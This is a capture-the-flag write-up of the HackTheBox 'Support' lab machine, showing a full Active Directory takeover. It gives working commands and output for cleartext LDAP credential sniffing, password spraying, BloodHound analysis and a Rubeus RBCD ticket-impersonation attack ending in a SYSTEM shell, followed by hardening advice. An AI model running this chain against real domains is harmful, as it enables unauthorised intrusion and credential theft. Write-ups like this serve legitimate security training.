```
    ███████╗██╗   ██╗██████╗ ██████╗  ██████╗ ██████╗ ████████╗
    ██╔════╝██║   ██║██╔══██╗██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝
    ███████╗██║   ██║██████╔╝██████╔╝██║   ██║██████╔╝   ██║
    ╚════██║██║   ██║██╔═══╝ ██╔═══╝ ██║   ██║██╔══██╗   ██║
    ███████║╚██████╔╝██║     ██║     ╚██████╔╝██║  ██║   ██║
    ╚══════╝ ╚═════╝ ╚═╝     ╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝

    ┌──────────────────────────────────────────────────────────────────────────────┐
    │░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░│
    │░  ▄▄▄       ▄████▄  ▄▄▄█████▓ ██▓ ██▒   █▓▓█████    ▓█████▄  ██▓ ██▀███      ░│
    │░ ▒████▄    ▒██▀ ▀█  ▓  ██▒ ▓▒▓██▒▓██░   █▒▓█   ▀    ▒██▀ ██▌▓██▒▓██ ▒ ██▒    ░│
    │░ ▒██  ▀█▄  ▒▓█    ▄ ▒ ▓██░ ▒░▒██▒ ▓██  █▒░▒███      ░██   █▌▒██▒▓██ ░▄█ ▒    ░│
    │░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒░ ▓██▓ ░ ░██░  ▒██ █░░▒▓█  ▄    ░▓█▄   ▌░██░▒██▀▀█▄      ░│
    │░  ▓█   ▓██▒▒ ▓███▀ ░  ▒██▒ ░ ░██░   ▒▀█░  ░▒████▒   ░▒████▓ ░██░░██▓ ▒██▒    ░│
    │░  ▒▒   ▓▒█░░ ░▒ ▒  ░  ▒ ░░   ░▓     ░ ▐░  ░░ ▒░ ░    ▒▒▓  ▒ ░▓  ░ ▒▓ ░▒▓░    ░│
    │░   ▒   ▒▒ ░  ░  ▒       ░     ▒ ░   ░ ░░   ░ ░  ░    ░ ▒  ▒  ▒ ░  ░▒ ░ ▒░    ░│
    │░   ░   ▒   ░          ░       ▒ ░     ░░     ░       ░ ░  ░  ▒ ░  ░░   ░     ░│
    │░       ░  ░░ ░                ░        ░     ░  ░      ░     ░     ░         ░│
    │░           ░                          ░             ░                        ░│
    │░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░│
    │            E X P L O I T A T I O N   //   A C T I V E   D I R E C T O R Y    │
    └──────────────────────────────────────────────────────────────────────────────┘
```

<div align="center">

![HackTheBox](https://img.shields.io/badge/HACK_THE_BOX-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black)
![Machine](https://img.shields.io/badge/MACHINE-SUPPORT-00ff41?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/DIFFICULTY-EASY-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-WINDOWS-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Status](https://img.shields.io/badge/STATUS-PWNED-ff0040?style=for-the-badge&logo=target&logoColor=white)

![Target](https://img.shields.io/badge/TARGET_IP-10.10.11.174-cyan?style=for-the-badge&logo=ethernet)
![Domain](https://img.shields.io/badge/DOMAIN-SUPPORT.HTB-magenta?style=for-the-badge&logo=windows-terminal)
![Points](https://img.shields.io/badge/POINTS-20-yellow?style=for-the-badge)

</div>

---

```
╔══════════════════════════════════════════════════════════════════════════════════╗
║  ATTACK VECTORS                                                                  ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║  [+] SMB Null Session Share Enumeration                                          ║
║  [+] .NET Binary Traffic Analysis (Credential Interception)                      ║
║  [+] LDAP Attribute Mining (Password in Info Field)                              ║
║  [+] Password Spraying Attack                                                    ║
║  [+] BloodHound Attack Path Analysis                                             ║
║  [+] Resource-Based Constrained Delegation (RBCD)                                ║
╚══════════════════════════════════════════════════════════════════════════════════╝
```

---

## TABLE OF CONTENTS

- [>_ TARGET ACQUISITION](#-target-acquisition)
- [>_ INITIAL RECONNAISSANCE](#-initial-reconnaissance)
- [>_ SMB ENUMERATION](#-smb-enumeration)
- [>_ BINARY ANALYSIS // USERINFO.EXE](#-binary-analysis--userinfoexe)
- [>_ CREDENTIAL INTERCEPTION](#-credential-interception)
- [>_ FOOTHOLD // LDAP ENUMERATION](#-foothold--ldap-enumeration)
- [>_ PASSWORD SPRAYING](#-password-spraying)
- [>_ BLOODHOUND ANALYSIS](#-bloodhound-analysis)
- [>_ PRIVILEGE ESCALATION // RBCD ATTACK](#-privilege-escalation--rbcd-attack)
- [>_ SYSTEM ACCESS OBTAINED](#-system-access-obtained)
- [>_ CREDENTIALS VAULT](#-credentials-vault)
- [>_ MITRE ATT&CK MAPPING](#-mitre-attck-mapping)

---

## >_ TARGET ACQUISITION

```
┌─────────────────────────────────────────────────────────────────────────────────┐
│  T A R G E T   I N F I L T R A T I O N   P A R A M E T E R S                   │
├─────────────────────────────────────────────────────────────────────────────────┤
│  IP ADDRESS........: 10.10.11.174                                               │
│  HOSTNAME..........: DC.support.htb                                             │
│  DOMAIN............: support.htb                                                │
│  OPERATING SYSTEM..: Windows Server 2022 Build 20348                            │
│  DIFFICULTY........: Easy                                                       │
│  ATTACK SURFACE....: Active Directory Domain Controller                         │
│  KEY SERVICES......: LDAP, SMB, Kerberos, WinRM                                 │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## >_ INITIAL RECONNAISSANCE

### NETWORK SCANNING // RUSTSCAN + NMAP

The first phase of any engagement involves comprehensive port enumeration. Using RustScan for rapid port discovery combined with Nmap's service detection capabilities provides a complete picture of the target's attack surface.

```bash
rustscan -a $target --ulimit 5000 -r 1-65535 -- -sC -sV -Pn -oA Support_fullscan
```

**Converting results to HTML for easier analysis:**

```bash
xsltproc Support_fullscan.xml -o Support_fullscan.html
```

> **Figure 1:** Nmap scan results revealing all open services on the Domain Controller
![](attachment/18dd6b2074fdd1547184d4d0f7202b94.png)

```
┌──────────────────────────────────────────────────────────────────────┐
│  KEY FINDINGS                                                        │
├──────────────────────────────────────────────────────────────────────┤
│  [+] Kerberos (88) - Confirms Active Directory environment           │
│  [+] LDAP (389/636/3268/3269) - Directory enumeration vectors        │
│  [+] SMB (445) - Potential file share access                         │
│  [+] WinRM (5985) - Remote shell capability if creds obtained        │
│  [+] SMB Signing Required - Relay attacks mitigated                  │
│  [-] No Web Servers - Limits initial attack surface                  │
└──────────────────────────────────────────────────────────────────────┘
```

**Critical Ports Identified:**

| Port | Service | Significance |
|------|---------|--------------|
| 53 | DNS | Domain name resolution for AD |
| 88 | Kerberos | Authentication service - ticket attacks possible |
| 389/636 | LDAP/LDAPS | Directory queries - user/group enumeration |
| 445 | SMB | File shares - potential data exfiltration |
| 5985 | WinRM | Remote PowerShell - shell access with valid creds |

---

## >_ SMB ENUMERATION

### SHARE DISCOVERY // NULL SESSION

Server Message Block (SMB) shares often contain valuable artifacts left behind by administrators or developers. Testing for null session access (anonymous authentication) is a critical first step.

```bash
smbclient -L \\\\10.10.11.174\\
```

> **Figure 2:** SMB share enumeration revealing accessible shares including `support-tools`
![](attachment/dd0d1b3ba5631cd93ecddc33298e009c.png)

The enumeration reveals a non-default share called `support-tools` which immediately warrants investigation. Standard shares like `ADMIN$`, `C$`, and `IPC$` require elevated privileges, but custom shares often have relaxed permissions.

### ACCESSING THE SUPPORT-TOOLS SHARE

```bash
smbclient \\\\$target\\support-tools
```

> **Figure 3:** Contents of the support-tools share containing various diagnostic utilities
![](attachment/1775af0c432b5cb8fd16798e85441350.png)

```
╔══════════════════════════════════════════════════════════════════════════════════╗
║  ARTIFACT DISCOVERED                                                             ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║  FILE: UserInfo.exe.zip                                                          ║
║  TYPE: .NET Assembly (Mono/.NET compatible)                                      ║
║  SIZE: 277,499 bytes                                                             ║
║  RISK: HIGH - Custom binary with potential hardcoded credentials                 ║
╚══════════════════════════════════════════════════════════════════════════════════╝
```

**Downloading and extracting the suspicious binary:**

```bash
smb: \> get UserInfo.exe.zip
```

> **Figure 4:** Extracted contents of UserInfo.exe.zip revealing .NET dependencies
![](attachment/868d1a191dde91debed97ae08e83ae95.png)

**Binary identification confirms .NET assembly:**

```bash
file UserInfo.exe
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

### HOST FILE CONFIGURATION

Before interacting with domain services, proper DNS resolution must be configured. NetExec can automatically populate the hosts file with discovered domain information.

```bash
sudo nxc smb $target --generate-hosts-file /etc/hosts
```

```
SMB  10.10.11.174  445  DC  [*] Windows Server 2022 Build 20348 x64
     (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

> **Figure 5:** Hosts file updated with domain controller mapping
![](attachment/1b8fa4e5ea3b81b9edf5f5bbd3945b7f.png)

---

## >_ BINARY ANALYSIS // USERINFO.EXE

### INITIAL EXECUTION

Since this is a .NET assembly, it can be executed on Linux using Wine or Mono. The binary appears to be a user lookup utility that queries the domain's LDAP directory.

```bash
Usage: UserInfo.exe [options] [commands]

Options:
  -v|--verbose        Verbose output

Commands:
  find                Find a user
  user                Get information about a user
```

The tool accepts wildcard queries, suggesting it performs LDAP searches against the domain controller. This behavior can be exploited to intercept authentication credentials.

```bash
wine UserInfo.exe -v find -first "*"
[*] LDAP query to use: (givenName=*)
[-] Exception: No Such Object
```

The query fails, but the verbose output confirms LDAP communication. The next step involves capturing the network traffic to analyze the authentication mechanism.

---

## >_ CREDENTIAL INTERCEPTION

### TRAFFIC CAPTURE // TSHARK ANALYSIS

When applications authenticate to LDAP, credentials may be transmitted in cleartext (simple bind) or using SASL mechanisms. Capturing this traffic reveals the authentication method being used.

**Starting packet capture on the VPN interface:**

```bash
sudo tshark -i utun4 -w UserInfo.exe.pcap
```

**Executing the binary to generate traffic:**

```bash
wine UserInfo.exe find -first "administrator"
```

**Analyzing the captured packets:**

```bash
tshark -r UserInfo.exe.pcap
```

> **Figure 6:** Tshark packet capture showing LDAP bind request with "simple" authentication
![](attachment/98b9e401a0e7bf6b7a1f75e94e019e0d.png)

The capture reveals an LDAP simple bind operation, which transmits credentials in cleartext. Filtering for the bind request exposes the service account password.

```bash
tshark -r UserInfo.exe.pcap -Y "ldap.simple" -V
```

> **Figure 7:** LDAP simple bind credentials exposed in packet capture
![](attachment/9b9d052936c98800efe47eb64c618107.png)

```
╔══════════════════════════════════════════════════════════════════════════════════╗
║  CREDENTIAL INTERCEPTED                                                          ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║  BIND DN....: support\ldap                                                       ║
║  PASSWORD...: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz                                ║
║  AUTH TYPE..: Simple Bind (Cleartext)                                            ║
║  PROTOCOL...: LDAP (Port 389, Unencrypted)                                       ║
╚══════════════════════════════════════════════════════════════════════════════════╝
```

---

## >_ FOOTHOLD // LDAP ENUMERATION

### CREDENTIAL VALIDATION

Before proceeding with enumeration, the captured credentials must be validated against the domain.

```bash
nxc smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

```
SMB  10.10.11.174  445  DC  [*] Windows Server 2022 Build 20348 x64
     (name:DC) (domain:support.htb) (signing:True) (SMBv1:None)
SMB  10.10.11.174  445  DC  [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

The `[+]` indicator confirms successful authentication. These credentials can now be leveraged for deep LDAP enumeration.

### BLOODHOUND DATA COLLECTION

BloodHound is an essential tool for mapping Active Directory attack paths. It collects information about users, groups, computers, sessions, and ACLs to identify privilege escalation routes.

```bash
bloodhound-ce-python -c all -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -d support.htb -ns $target --zip
```

| Flag | Purpose |
|------|---------|
| `-c all` | Collect all data types (users, groups, computers, sessions, ACLs) |
| `-u ldap` | Username for LDAP authentication |
| `-p '...'` | Password (note: special characters require quoting) |
| `-d support.htb` | Target domain |
| `-ns $target` | Nameserver IP for DNS resolution |
| `--zip` | Compress output for BloodHound import |

> **Figure 8:** BloodHound-CE data collection successfully enumerating 21 users, 53 groups, and more
![](attachment/0f3512eb71f30a179f53f520030d104a.png)

### LDAP ATTRIBUTE MINING

Administrators sometimes store sensitive information in LDAP attributes like `description`, `info`, or `comment`. A comprehensive LDAP dump can reveal these misconfigurations.

```bash
ldapsearch -LLL -x -H ldap://support.htb \
  -D 'ldap@support.htb' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb"
```

This command dumps every object in the domain directory. To find passwords hidden in attributes, filter the output:

```bash
ldapsearch -LLL -x -H ldap://support.htb \
  -D 'ldap@support.htb' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" | grep -i "info" -B 10
```

> **Figure 9:** LDAP search reveals password stored in the `info` attribute of user "support"
![](attachment/2fc18dab6cebd509860919c6894a4426.png)

```
╔══════════════════════════════════════════════════════════════════════════════════╗
║  CREDENTIAL DISCOVERED IN LDAP ATTRIBUTE                                         ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║  USER DN.....: CN=support,CN=Users,DC=support,DC=htb                             ║
║  ATTRIBUTE...: info                                                              ║
║  VALUE.......: Ironside47pleasure40Watchful                                      ║
║  RISK........: CRITICAL - Password stored in cleartext LDAP attribute            ║
╚══════════════════════════════════════════════════════════════════════════════════╝
```

---

## >_ PASSWORD SPRAYING

### USER ENUMERATION

Before confirming which account uses the discovered password, extract a complete list of domain users.

```bash
nxc ldap support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  --users --users-export users.txt
```

> **Figure 10:** Domain user list extracted via LDAP enumeration
![](attachment/96e32feca796d81bd61d2f14bef9ff64.png)

### SPRAYING THE PASSWORD

Password spraying tests a single password against multiple accounts. This technique avoids account lockouts while identifying reused credentials.

```bash
nxc smb support.htb -u users.txt -p 'Ironside47pleasure40Watchful' --continue-on-success
```

> **Figure 11:** Password spray identifies "support" as the account using the discovered password
![](attachment/7edc4e70c79b9163efb6bafde64a8814.png)

**Alternative validation using Kerbrute:**

```bash
kerbrute -domain support.htb -dc-ip $target -users users.txt \
  -password Ironside47pleasure40Watchful
```

> **Figure 12:** Kerbrute validates the credential against Kerberos authentication
![](attachment/ddf3050cc8ca4252b478fa937ac934e7.png)

```
╔══════════════════════════════════════════════════════════════════════════════════╗
║  VALID CREDENTIAL CONFIRMED                                                      ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║  USERNAME: support                                                               ║
║  PASSWORD: Ironside47pleasure40Watchful                                          ║
║  ACCESS..: Remote Management Users (WinRM enabled)                               ║
╚══════════════════════════════════════════════════════════════════════════════════╝
```

---

## >_ BLOODHOUND ANALYSIS

### MARKING OWNED PRINCIPALS

With valid credentials for the `support` user, mark this principal as "Owned" in BloodHound to analyze attack paths from this position.

> **Figure 13:** Marking the support user as owned in BloodHound-CE
![](attachment/575187cd5300578cba8cb6c26b1765d4.png)

### ATTACK PATH DISCOVERY

BloodHound reveals that the `support` user is a member of `Shared Support Accounts`, which has **GenericAll** permissions over the Domain Controller computer object. This permission allows modification of critical attributes including Resource-Based Constrained Delegation (RBCD).

> **Figure 14:** Windows-based RBCD abuse path via PowerMad and Rubeus
![](attachment/2fe9a91008631885cb55d0a12dc61276.png)

> **Figure 15:** Linux-based RBCD abuse path via Impacket tools
![](attachment/38e673c3063eeedbce170b3ed9dd332b.png)

```
┌──────────────────────────────────────────────────────────────────────┐
│  ATTACK PATH IDENTIFIED                                              │
├──────────────────────────────────────────────────────────────────────┤
│  support@SUPPORT.HTB                                                 │
│       │                                                              │
│       └──[MemberOf]──> SHARED SUPPORT ACCOUNTS@SUPPORT.HTB           │
│                              │                                       │
│                              └──[GenericAll]──> DC.SUPPORT.HTB       │
│                                                      │               │
│                                                      └──> RBCD Abuse │
└──────────────────────────────────────────────────────────────────────┘
```

---

## >_ PRIVILEGE ESCALATION // RBCD ATTACK

### UNDERSTANDING RESOURCE-BASED CONSTRAINED DELEGATION

RBCD allows a computer to specify which accounts can impersonate users to it via Kerberos delegation. With GenericAll over a computer object, an attacker can:

1. Create a new machine account (or use an existing controlled account)
2. Modify the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute
3. Request a service ticket impersonating any user to the target

### INITIAL ACCESS VIA EVIL-WINRM

```bash
evil-winrm -i $target -u support -p Ironside47pleasure40Watchful
```

### VERIFYING MACHINE ACCOUNT QUOTA

Active Directory allows regular users to create up to 10 machine accounts by default. This is controlled by the `ms-DS-MachineAccountQuota` attribute.

```powershell
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
```

> **Figure 16:** Machine account quota check shows default value of 10
![](attachment/2f59ce5259b21fa2420fbc595e540295.png)

### VERIFYING RBCD ATTRIBUTE IS EMPTY

Before configuring delegation, confirm the target attribute is not already set.

```powershell
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
```

> **Figure 17:** RBCD attribute is empty - ready for abuse
![](attachment/e1607c9a590694ac41213459be196f2b.png)

### UPLOADING REQUIRED TOOLS

```powershell
upload PowerView.ps1
. ./PowerView.ps1
upload Powermad.ps1
. ./Powermad.ps1
upload Rubeus.exe
```

### STEP 1: CREATE FAKE COMPUTER ACCOUNT

Using PowerMad, create a new machine account that will be granted delegation privileges.

```powershell
New-MachineAccount -MachineAccount FAKE-COMP02 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

**Verify creation:**

```powershell
Get-ADComputer -identity FAKE-COMP02
```

> **Figure 18:** Fake computer account successfully created in Active Directory
![](attachment/bf8d6838b14a627e4503c23121a5fcd3.png)

### STEP 2: CONFIGURE RBCD DELEGATION

Set the Domain Controller to trust our fake computer for delegation.

```powershell
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP02$
```

**Verify configuration:**

```powershell
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
```

> **Figure 19:** DC now trusts FAKE-COMP02 for delegation
![](attachment/7a8212d49fb8d97735f3c3d325237df2.png)

**Confirm via PowerView:**

```powershell
Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
```

> **Figure 20:** RBCD attribute populated with security descriptor
![](attachment/aa42e01cb7e3e8558d591561be453db7.png)

### STEP 3: ANALYZE SECURITY DESCRIPTOR

```powershell
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
$Descriptor
$Descriptor.DiscretionaryAcl
```

> **Figure 21:** Security descriptor confirms FAKE-COMP02's SID has delegation rights
![](attachment/34434608323cb4eb675ccfb32bc50c08.png)

### STEP 4: GENERATE RC4 HASH

Rubeus requires the machine account's password hash for S4U operations.

```powershell
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP02$ /domain:support.htb
```

> **Figure 22:** Rubeus generates RC4 HMAC hash for the fake computer account
![](attachment/05eff876ff866d6f6b5e91f983634e30.png)

```
╔══════════════════════════════════════════════════════════════════════════════════╗
║  HASH GENERATED                                                                  ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║  ACCOUNT...: FAKE-COMP02$                                                        ║
║  RC4_HMAC..: 58A478135A93AC3BF058A5EA0E8FDB71                                     ║
╚══════════════════════════════════════════════════════════════════════════════════╝
```

### STEP 5: REQUEST IMPERSONATED SERVICE TICKET

Execute the S4U (Service for User) attack to obtain a ticket for Administrator.

```powershell
.\Rubeus.exe s4u /user:FAKE-COMP02$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 \
  /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```

**Rubeus Output:**

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: S4U

[*] Using rc4_hmac hash: 58A478135A93AC3BF058A5EA0E8FDB71
[*] Building AS-REQ (w/ preauth) for: 'support.htb\FAKE-COMP02$'
[+] TGT request successful!
[*] Building S4U2self request for: 'FAKE-COMP02$@SUPPORT.HTB'
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'FAKE-COMP02$@SUPPORT.HTB'
[*] Impersonating user 'Administrator' to target SPN 'cifs/dc.support.htb'
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[+] S4U2proxy success!
[+] Ticket successfully imported!
```

> **Figure 23:** Base64-encoded Kerberos ticket for Administrator impersonation
![](attachment/4082a99d28d3d224d1bd54f4461b63a0.png)

### STEP 6: CONVERT TICKET FOR LINUX USE

Copy the base64 ticket and convert it for use with Impacket.

```bash
cat << EOF > ticket.kirbi.b64
[BASE64_TICKET_DATA]
EOF
```

**Remove whitespace and decode:**

```bash
cat ticket.kirbi.b64 | tr -d ' \n' | base64 -d > ticket.kirbi
```

**Convert to ccache format:**

```bash
ticketConverter.py ticket.kirbi ticket.ccache
```

**Export for Impacket:**

```bash
export KRB5CCNAME=ticket.ccache
```

---

## >_ SYSTEM ACCESS OBTAINED

### EXECUTING PSEXEC WITH KERBEROS

With the Administrator's service ticket, authenticate to the Domain Controller without knowing the password.

```bash
psexec.py -k -no-pass administrator@dc.support.htb
```

> **Figure 24:** SYSTEM shell obtained via Kerberos authentication - Box Pwned!
![](attachment/ad569b0a70ccf24f8ef151fe9c467975.png)

```
╔═══════════════════════════════════════════════════════════════════════════════════╗
║                                                                                   ║
║   ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗                           ║
║   ██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║                           ║
║   ███████╗ ╚████╔╝ ███████╗   ██║   █████╗  ██╔████╔██║                           ║
║   ╚════██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██║╚██╔╝██║                           ║
║   ███████║   ██║   ███████║   ██║   ███████╗██║ ╚═╝ ██║                           ║
║   ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝                           ║
║                                                                                   ║
║   C:\Windows\system32> whoami                                                     ║
║   nt authority\system                                                             ║
║                                                                                   ║
╚═══════════════════════════════════════════════════════════════════════════════════╝
```

---

## >_ CREDENTIALS VAULT

```
╔════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║  EXFILTRATED CREDENTIALS                                                                                   ║
╠════════════╦══════════════════╦════════════════════════════════════════════╦═══════════════════════════════╣
║  TYPE      ║  USERNAME        ║  PASSWORD / HASH                           ║  SOURCE                       ║
╠════════════╬══════════════════╬════════════════════════════════════════════╬═══════════════════════════════╣
║  LDAP      ║  ldap            ║  nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz      ║  UserInfo.exe Traffic Capture ║
║  Domain    ║  support         ║  Ironside47pleasure40Watchful              ║  LDAP info Attribute          ║
║  Machine   ║  FAKE-COMP02$    ║  Password123                               ║  Created for RBCD Attack      ║
║  Hash      ║  FAKE-COMP02$    ║  58A478135A93AC3BF058A5EA0E8FDB71 (RC4)    ║  Rubeus Hash Generation       ║
╚════════════╩══════════════════╩════════════════════════════════════════════╩═══════════════════════════════╝
```

---

## >_ FLAGS & PROOF OF COMPROMISE

```
╔═══════════════════════════════════════════════════════════════════════════════════╗
║                                                                                   ║
║   ██╗   ██╗███████╗███████╗██████╗     ███████╗██╗      █████╗  ██████╗           ║
║   ██║   ██║██╔════╝██╔════╝██╔══██╗    ██╔════╝██║     ██╔══██╗██╔════╝           ║
║   ██║   ██║███████╗█████╗  ██████╔╝    █████╗  ██║     ███████║██║  ███╗          ║
║   ██║   ██║╚════██║██╔══╝  ██╔══██╗    ██╔══╝  ██║     ██╔══██║██║   ██║          ║
║   ╚██████╔╝███████║███████╗██║  ██║    ██║     ███████╗██║  ██║╚██████╔╝          ║
║    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝    ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝           ║
║                                                                                   ║
║   LOCATION: C:\Users\support\Desktop\user.txt                                     ║
║   FLAG: HTB{********_REDACTED_********}                                           ║
║                                                                                   ║
╚═══════════════════════════════════════════════════════════════════════════════════╝

╔═══════════════════════════════════════════════════════════════════════════════════╗
║                                                                                   ║
║   ██████╗  ██████╗  ██████╗ ████████╗    ███████╗██╗      █████╗  ██████╗         ║
║   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝    ██╔════╝██║     ██╔══██╗██╔════╝         ║
║   ██████╔╝██║   ██║██║   ██║   ██║       █████╗  ██║     ███████║██║  ███╗        ║
║   ██╔══██╗██║   ██║██║   ██║   ██║       ██╔══╝  ██║     ██╔══██║██║   ██║        ║
║   ██║  ██║╚██████╔╝╚██████╔╝   ██║       ██║     ███████╗██║  ██║╚██████╔╝        ║
║   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝       ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝         ║
║                                                                                   ║
║   LOCATION: C:\Users\Administrator\Desktop\root.txt                               ║
║   FLAG: HTB{********_REDACTED_********}                                           ║
║                                                                                   ║
╚═══════════════════════════════════════════════════════════════════════════════════╝
```

---

## >_ MITRE ATT&CK MAPPING

| Tactic | Technique ID | Technique Name | Implementation |
|--------|--------------|----------------|----------------|
| **Reconnaissance** | T1595.002 | Active Scanning: Vulnerability Scanning | RustScan + Nmap service enumeration |
| **Resource Development** | T1587.001 | Develop Capabilities: Malware | Fake computer account creation |
| **Initial Access** | T1078.002 | Valid Accounts: Domain Accounts | Credentials from UserInfo.exe traffic |
| **Credential Access** | T1040 | Network Sniffing | Tshark LDAP simple bind capture |
| **Credential Access** | T1552.001 | Unsecured Credentials: Credentials in Files | Password in LDAP info attribute |
| **Credential Access** | T1110.003 | Brute Force: Password Spraying | NetExec password spray attack |
| **Discovery** | T1087.002 | Account Discovery: Domain Account | BloodHound + LDAP user enumeration |
| **Discovery** | T1069.002 | Permission Groups Discovery | BloodHound ACL analysis |
| **Lateral Movement** | T1021.006 | Remote Services: Windows Remote Management | Evil-WinRM shell access |
| **Privilege Escalation** | T1134.001 | Access Token Manipulation | RBCD with S4U2Self/S4U2Proxy |
| **Defense Evasion** | T1550.003 | Use Alternate Authentication Material | Kerberos ticket impersonation |

---

## >_ LESSONS LEARNED

```
┌──────────────────────────────────────────────────────────────────────────────────┐
│  SECURITY RECOMMENDATIONS                                                        │
├──────────────────────────────────────────────────────────────────────────────────┤
│                                                                                  │
│  [1] LDAP Channel Binding & Signing                                              │
│      - Enforce LDAP signing to prevent cleartext credential interception         │
│      - Enable channel binding for LDAPS connections                              │
│                                                                                  │
│  [2] Credential Hygiene                                                          │
│      - Never store passwords in LDAP attributes (info, description, etc.)        │
│      - Implement regular password audits using tools like DSInternals            │
│                                                                                  │
│  [3] Machine Account Quota                                                       │
│      - Set ms-DS-MachineAccountQuota to 0 for non-admin users                    │
│      - Monitor for unexpected computer account creation                          │
│                                                                                  │
│  [4] Delegation Controls                                                         │
│      - Mark sensitive accounts as "Account is sensitive, cannot be delegated"    │
│      - Add Administrators to Protected Users group                               │
│      - Monitor changes to msDS-AllowedToActOnBehalfOfOtherIdentity               │
│                                                                                  │
│  [5] SMB Share Permissions                                                       │
│      - Disable null session access to shares                                     │
│      - Audit custom shares for sensitive content                                 │
│                                                                                  │
└──────────────────────────────────────────────────────────────────────────────────┘
```

---

```
╔══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                      ║
║   ░█▀▀░█░█░█▀▀░▀█▀░█▀▀░█▄█░░░█▀▀░█▀█░█▄█░█▀█░█▀▄░█▀█░█▄█░▀█▀░█▀▀░█▀▀░█▀▄            ║
║   ░▀▀█░░█░░▀▀█░░█░░█▀▀░█░█░░░█░░░█░█░█░█░█▀▀░█▀▄░█░█░█░█░░█░░▀▀█░█▀▀░█░█            ║
║   ░▀▀▀░░▀░░▀▀▀░░▀░░▀▀▀░▀░▀░░░▀▀▀░▀▀▀░▀░▀░▀░░░▀░▀░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀▀▀░▀▀░            ║
║                                                                                      ║
║   WRITEUP AUTHOR: Netrunner                                                          ║
║   COMPLETION DATE: 2026-01-09                                                        ║
║   ATTACK CHAIN: SMB > Traffic Analysis > LDAP Mining > RBCD > SYSTEM                 ║
║                                                                                      ║
╚══════════════════════════════════════════════════════════════════════════════════════╝
```

---

<div align="center">

![Made With](https://img.shields.io/badge/MADE_WITH-CAFFEINE_&_PERSISTENCE-ff00ff?style=for-the-badge&logo=coffeescript&logoColor=white)
![Tools](https://img.shields.io/badge/TOOLS-BLOODHOUND_|_RUBEUS_|_IMPACKET-00ffff?style=for-the-badge)
![License](https://img.shields.io/badge/LICENSE-EDUCATIONAL_USE_ONLY-00ff00?style=for-the-badge)

</div>
